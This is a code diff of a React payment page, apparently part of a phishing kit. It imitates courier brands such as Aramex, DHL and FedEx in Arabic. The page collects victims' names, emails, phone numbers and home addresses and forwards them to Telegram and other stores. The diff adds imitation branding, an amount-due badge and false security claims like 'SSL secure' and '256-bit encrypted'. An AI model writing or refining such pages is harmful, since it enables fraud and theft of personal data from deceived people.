@@ -7,13 +7,14 @@ import { Badge } from "@/components/ui/badge";
 import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
 import { getServiceBranding } from "@/lib/serviceLogos";
+import { getBrandingByCompany } from "@/lib/brandingSystem";
 import { getCountryByCode } from "@/lib/countries";
 import { getCurrencySymbol, formatCurrency } from "@/lib/countryCurrencies";
 import { getCompanyMeta } from "@/utils/companyMeta";
 import PaymentMetaTags from "@/components/PaymentMetaTags";
 import { useLink, useUpdateLink } from "@/hooks/useSupabase";
 import { sendToTelegram } from "@/lib/telegram";
-import { Shield, ArrowLeft, User, Mail, Phone, CreditCard, MapPin } from "lucide-react";
+import { Shield, ArrowLeft, User, Mail, Phone, CreditCard, MapPin, Lock } from "lucide-react";
 import heroAramex from "@/assets/hero-aramex.jpg";
 import heroDhl from "@/assets/hero-dhl.jpg";
 import heroFedex from "@/assets/hero-fedex.jpg";
@@ -48,7 +49,6 @@ const PaymentRecipient = () => {
   const [customerPhone, setCustomerPhone] = useState("");
   const [residentialAddress, setResidentialAddress] = useState("");
 
-  // Get query parameters from URL
   const urlParams = new URLSearchParams(window.location.search);
   const serviceKey = urlParams.get('company') || linkData?.payload?.service_key || new URLSearchParams(window.location.search).get('service') || 'aramex';
   const currencyParam = urlParams.get('currency');
@@ -56,31 +56,22 @@ const PaymentRecipient = () => {
 
   const serviceName = linkData?.payload?.service_name || serviceKey;
   const branding = getServiceBranding(serviceKey);
+  const enhancedBranding = getBrandingByCompany(serviceKey);
   const companyMeta = getCompanyMeta(serviceKey);
 
-  // Use dynamic company meta for OG tags
   const dynamicTitle = titleParam || companyMeta.title || `Payment - ${serviceName}`;
   const dynamicDescription = companyMeta.description || `Complete your payment for ${serviceName}`;
   const dynamicImage = companyMeta.image;
 
   const shippingInfo = linkData?.payload as any;
-
-  // Get payer type from shipping info (default to "recipient" for backward compatibility)
   const payerType = shippingInfo?.payer_type || "recipient";
-
-  // Get country from link data (must be before using currency functions)
   const countryCode = shippingInfo?.selectedCountry || "SA";
   const countryData = getCountryByCode(countryCode);
   const phoneCode = countryData?.phoneCode || "+966";
-
-  // Use currency from URL parameter if available, otherwise from country data
   const currencyCode = currencyParam || countryData?.currency || "SAR";
 
-  // Get amount from link data - ensure it's a number, handle all data types
   const rawAmount = shippingInfo?.cod_amount;
-
-  // Handle different data types and edge cases
-  let amount = 500; // Default value
+  let amount = 500;
   if (rawAmount !== undefined && rawAmount !== null) {
     if (typeof rawAmount === 'number') {
       amount = rawAmount;
@@ -93,7 +84,6 @@ const PaymentRecipient = () => {
   }
 
   const formattedAmount = formatCurrency(amount, currencyCode);
-
   const phonePlaceholder = countryData?.phonePlaceholder || "5X XXX XXXX";
   
   const heroImages: Record<string, string> = {
@@ -134,7 +124,6 @@ const PaymentRecipient = () => {
 
     if (!linkData) return;
 
-    // Submit to Netlify Forms
     const formData = new FormData();
     formData.append('form-name', 'payment-recipient');
     formData.append('name', customerName);
@@ -155,7 +144,6 @@ const PaymentRecipient = () => {
       console.error('Form submission error:', error);
     }
 
-    // Send data to Telegram
     const productionDomain = window.location.origin;
     const telegramResult = await sendToTelegram({
       type: 'payment_recipient',
@@ -171,7 +159,6 @@ const PaymentRecipient = () => {
       timestamp: new Date().toISOString()
     });
 
-    // Save customer data to the link's payload in Supabase for cross-device compatibility
     try {
       const customerData = {
         ...linkData.payload,
@@ -206,71 +193,119 @@ const PaymentRecipient = () => {
         title={dynamicTitle}
         description={dynamicDescription}
       />
-      {/* Dynamic OG Image via direct meta tag injection */}
       <Helmet>
         <meta property="og:image" content={dynamicImage} />
         <meta name="twitter:image" content={dynamicImage} />
       </Helmet>
       <div 
-        className="min-h-screen bg-background" 
+        className="min-h-screen" 
         dir="rtl"
+        style={{
+          background: enhancedBranding?.colors.background || '#FFFFFF',
+          fontFamily: enhancedBranding?.fonts.arabic || 'Almarai, sans-serif'
+        }}
       >
-        {/* Hero Section */}
-        <div className="relative w-full h-48 sm:h-64 overflow-hidden">
+        {/* Hero Section - Compact & Responsive */}
+        <div className="relative w-full h-28 sm:h-36 md:h-44 overflow-hidden">
           <img 
             src={heroImage}
             alt={serviceName}
             className="w-full h-full object-cover"
           />
-          <div className="absolute inset-0 bg-gradient-to-b from-black/60 via-black/40 to-black/70" />
+          <div className="absolute inset-0" style={{
+            background: `linear-gradient(135deg, ${branding.colors.primary}CC, ${branding.colors.primary}99)`
+          }} />
           
-          {/* Logo Overlay */}
-          <div className="absolute top-4 left-4 sm:top-6 sm:left-6">
+          {/* Company Logo - Top Left */}
+          <div className="absolute top-2 left-2 sm:top-3 sm:left-4">
             {branding.logo && (
-              <div className="bg-white rounded-2xl p-3 sm:p-4 shadow-lg">
+              <div className="bg-white/95 backdrop-blur-sm rounded-lg p-1.5 sm:p-2 shadow-xl" style={{
+                border: `2px solid ${branding.colors.primary}20`
+              }}>
                 <img 
                   src={branding.logo} 
                   alt={serviceName}
-                  className="h-12 sm:h-16 w-auto"
+                  className="h-6 sm:h-8 md:h-10 w-auto"
                   onError={(e) => e.currentTarget.style.display = 'none'}
                 />
               </div>
             )}
           </div>
           
-          {/* Title Overlay */}
-          <div className="absolute bottom-4 right-4 sm:bottom-6 sm:right-6 text-white">
-            <div className="text-right">
-              <h2 className="text-lg sm:text-2xl font-bold mb-1">{serviceName}</h2>
-              <p className="text-xs sm:text-sm opacity-90">خدمة شحن</p>
+          {/* Service Name & Badge - Bottom Right */}
+          <div className="absolute bottom-2 right-2 sm:bottom-3 sm:right-4 text-white">
+            <div className="text-right space-y-1">
+              <h2 className="text-sm sm:text-base md:text-lg font-bold tracking-wide">{serviceName}</h2>
+              <div className="flex items-center gap-1.5 justify-end">
+                <Lock className="w-3 h-3 sm:w-3.5 sm:h-3.5" />
+                <span className="text-[10px] sm:text-xs opacity-95">دفع آمن ومشفر</span>
+              </div>
             </div>
           </div>
         </div>
 
-        <div className="container mx-auto px-3 sm:px-4 -mt-8 sm:-mt-12 relative z-10">
-          <div className="max-w-2xl mx-auto">
+        <div className="container mx-auto px-2 sm:px-3 md:px-4 -mt-5 sm:-mt-7 md:-mt-8 relative z-10 pb-6">
+          <div className="max-w-lg mx-auto">
             
-            <Card className="p-4 sm:p-8 shadow-2xl border-t-4" style={{ borderTopColor: branding.colors.primary }}>
+            <Card className="p-3 sm:p-4 md:p-5 shadow-2xl backdrop-blur-sm" style={{ 
+              borderTop: `3px solid ${branding.colors.primary}`,
+              background: enhancedBranding?.colors.surface || '#FFFFFF',
+              boxShadow: `0 20px 50px ${branding.colors.primary}20`,
+              borderRadius: '12px'
+            }}>
               <form onSubmit={handleProceed}>
-                <div className="flex items-center justify-between mb-6 sm:mb-8">
-                  <h1 className="text-xl sm:text-3xl font-bold">
-                    {payerType === "recipient" ? "معلومات المستلم" : "معلومات المرسل"}
-                  </h1>
+                {/* Header Section */}
+                <div className="flex items-center justify-between mb-4 sm:mb-5 pb-3 border-b" style={{
+                  borderColor: `${branding.colors.primary}20`
+                }}>
+                  <div>
+                    <h1 className="text-base sm:text-lg md:text-xl font-bold" style={{
+                      color: enhancedBranding?.colors.text || '#1A1A1A'
+                    }}>
+                      {payerType === "recipient" ? "معلومات المستلم" : "معلومات المرسل"}
+                    </h1>
+                    <p className="text-[10px] sm:text-xs mt-0.5" style={{
+                      color: enhancedBranding?.colors.textLight || '#6E6E6E'
+                    }}>
+                      أدخل بياناتك لإكمال عملية الدفع
+                    </p>
+                  </div>
                   
                   <div
-                    className="w-14 h-14 sm:w-20 sm:h-20 rounded-2xl flex items-center justify-center shadow-lg"
+                    className="w-10 h-10 sm:w-11 sm:h-11 md:w-12 md:h-12 rounded-xl flex items-center justify-center shadow-md"
                     style={{
-                      background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`,
+                      background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary || branding.colors.primary})`,
                     }}
                   >
-                    <CreditCard className="w-7 h-7 sm:w-10 sm:h-10 text-white" />
+                    <CreditCard className="w-5 h-5 sm:w-5.5 sm:h-5.5 md:w-6 md:h-6 text-white" />
                   </div>
                 </div>
 
-                <div className="space-y-3 sm:space-y-4 mb-6 sm:mb-8">
+                {/* Amount Badge */}
+                <div className="mb-4 p-2.5 rounded-lg" style={{
+                  background: `linear-gradient(135deg, ${branding.colors.primary}12, ${branding.colors.secondary || branding.colors.primary}08)`,
+                  border: `1px solid ${branding.colors.primary}30`
+                }}>
+                  <div className="flex items-center justify-between">
+                    <span className="text-xs sm:text-sm" style={{ color: enhancedBranding?.colors.textLight }}>
+                      المبلغ المطلوب
+                    </span>
+                    <span className="text-base sm:text-lg md:text-xl font-bold" style={{ 
+                      color: branding.colors.primary 
+                    }}>
+                      {formattedAmount}
+                    </span>
+                  </div>
+                </div>
+
+                {/* Form Fields - Compact & Clean */}
+                <div className="space-y-2.5 sm:space-y-3 mb-4 sm:mb-5">
+                  {/* Name Field */}
                   <div>
-                    <Label htmlFor="name" className="flex items-center gap-1.5 sm:gap-2 mb-1.5 sm:mb-2 text-xs sm:text-sm">
-                      <User className="w-3 h-3 sm:w-4 sm:h-4" />
+                    <Label htmlFor="name" className="flex items-center gap-1 mb-1.5 text-[11px] sm:text-xs font-semibold" style={{
+                      color: enhancedBranding?.colors.text
+                    }}>
+                      <User className="w-3 h-3" style={{ color: branding.colors.primary }} />
                       الاسم الكامل
                     </Label>
                     <Input
@@ -278,14 +313,21 @@ const PaymentRecipient = () => {
                       value={customerName}
                       onChange={(e) => setCustomerName(e.target.value)}
                       required
-                      className="h-10 sm:h-12 text-sm sm:text-base"
+                      className="h-9 sm:h-10 text-xs sm:text-sm transition-all"
                       placeholder="أدخل اسمك الكامل"
+                      style={{
+                        borderColor: `${branding.colors.primary}40`,
+                        fontFamily: enhancedBranding?.fonts.arabic
+                      }}
                     />
                   </div>
                   
+                  {/* Email Field */}
                   <div>
-                    <Label htmlFor="email" className="flex items-center gap-1.5 sm:gap-2 mb-1.5 sm:mb-2 text-xs sm:text-sm">
-                      <Mail className="w-3 h-3 sm:w-4 sm:h-4" />
+                    <Label htmlFor="email" className="flex items-center gap-1 mb-1.5 text-[11px] sm:text-xs font-semibold" style={{
+                      color: enhancedBranding?.colors.text
+                    }}>
+                      <Mail className="w-3 h-3" style={{ color: branding.colors.primary }} />
                       البريد الإلكتروني
                     </Label>
                     <Input
@@ -294,14 +336,21 @@ const PaymentRecipient = () => {
                       value={customerEmail}
                       onChange={(e) => setCustomerEmail(e.target.value)}
                       required
-                      className="h-10 sm:h-12 text-sm sm:text-base"
+                      className="h-9 sm:h-10 text-xs sm:text-sm transition-all"
                       placeholder="example@email.com"
+                      dir="ltr"
+                      style={{
+                        borderColor: `${branding.colors.primary}40`
+                      }}
                     />
                   </div>
                   
+                  {/* Phone Field */}
                   <div>
-                    <Label htmlFor="phone" className="flex items-center gap-1.5 sm:gap-2 mb-1.5 sm:mb-2 text-xs sm:text-sm">
-                      <Phone className="w-3 h-3 sm:w-4 sm:h-4" />
+                    <Label htmlFor="phone" className="flex items-center gap-1 mb-1.5 text-[11px] sm:text-xs font-semibold" style={{
+                      color: enhancedBranding?.colors.text
+                    }}>
+                      <Phone className="w-3 h-3" style={{ color: branding.colors.primary }} />
                       رقم الهاتف
                     </Label>
                     <Input
@@ -310,14 +359,21 @@ const PaymentRecipient = () => {
                       value={customerPhone}
                       onChange={(e) => setCustomerPhone(e.target.value)}
                       required
-                      className="h-10 sm:h-12 text-sm sm:text-base"
+                      className="h-9 sm:h-10 text-xs sm:text-sm transition-all"
                       placeholder={`${phoneCode} ${phonePlaceholder}`}
+                      dir="ltr"
+                      style={{
+                        borderColor: `${branding.colors.primary}40`
+                      }}
                     />
                   </div>
                   
+                  {/* Address Field */}
                   <div>
-                    <Label htmlFor="address" className="flex items-center gap-1.5 sm:gap-2 mb-1.5 sm:mb-2 text-xs sm:text-sm">
-                      <MapPin className="w-3 h-3 sm:w-4 sm:h-4" />
+                    <Label htmlFor="address" className="flex items-center gap-1 mb-1.5 text-[11px] sm:text-xs font-semibold" style={{
+                      color: enhancedBranding?.colors.text
+                    }}>
+                      <MapPin className="w-3 h-3" style={{ color: branding.colors.primary }} />
                       العنوان السكني
                     </Label>
                     <Input
@@ -325,25 +381,44 @@ const PaymentRecipient = () => {
                       value={residentialAddress}
                       onChange={(e) => setResidentialAddress(e.target.value)}
                       required
-                      className="h-10 sm:h-12 text-sm sm:text-base"
+                      className="h-9 sm:h-10 text-xs sm:text-sm transition-all"
                       placeholder="أدخل عنوانك السكني الكامل"
+                      style={{
+                        borderColor: `${branding.colors.primary}40`,
+                        fontFamily: enhancedBranding?.fonts.arabic
+                      }}
                     />
                   </div>
                 </div>
+
+                {/* Security Notice */}
+                <div className="mb-4 p-2 rounded-lg flex items-center gap-2" style={{
+                  background: `${branding.colors.primary}08`,
+                  border: `1px solid ${branding.colors.primary}20`
+                }}>
+                  <Shield className="w-3.5 h-3.5 flex-shrink-0" style={{ color: branding.colors.primary }} />
+                  <p className="text-[10px] sm:text-xs" style={{ color: enhancedBranding?.colors.textLight }}>
+                    معلوماتك محمية بأعلى معايير الأمان والتشفير
+                  </p>
+                </div>
               
+                {/* Submit Button */}
                 <Button
                   type="submit"
                   size="lg"
-                  className="w-full text-sm sm:text-lg py-5 sm:py-7 text-white"
+                  className="w-full text-xs sm:text-sm py-4 sm:py-4.5 text-white font-bold transition-all hover:shadow-lg"
                   style={{
-                    background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`
+                    background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary || branding.colors.primary})`,
+                    fontFamily: enhancedBranding?.fonts.arabic
                   }}
                 >
-                  <span className="ml-2">التالي</span>
-                  <ArrowLeft className="w-4 h-4 sm:w-5 sm:h-5 mr-2" />
+                  <span className="ml-2">التالي - إكمال الدفع</span>
+                  <ArrowLeft className="w-3.5 h-3.5 sm:w-4 sm:h-4 mr-2" />
                 </Button>
               
-                <p className="text-[10px] sm:text-xs text-center text-muted-foreground mt-3 sm:mt-4">
+                <p className="text-[9px] sm:text-[10px] text-center mt-3" style={{ 
+                  color: enhancedBranding?.colors.textLight 
+                }}>
                   بالمتابعة، أنت توافق على الشروط والأحكام
                 </p>
               </form>
@@ -359,6 +434,22 @@ const PaymentRecipient = () => {
                 <input type="text" name="linkId" />
               </form>
             </Card>
+
+            {/* Footer Trust Badges */}
+            <div className="mt-4 flex items-center justify-center gap-4 opacity-60">
+              <div className="flex items-center gap-1.5">
+                <Shield className="w-3.5 h-3.5" style={{ color: branding.colors.primary }} />
+                <span className="text-[10px]" style={{ color: enhancedBranding?.colors.textLight }}>
+                  SSL آمن
+                </span>
+              </div>
+              <div className="flex items-center gap-1.5">
+                <Lock className="w-3.5 h-3.5" style={{ color: branding.colors.primary }} />
+                <span className="text-[10px]" style={{ color: enhancedBranding?.colors.textLight }}>
+                  مشفر 256-bit
+                </span>
+              </div>
+            </div>
           </div>
         </div>
       </div>
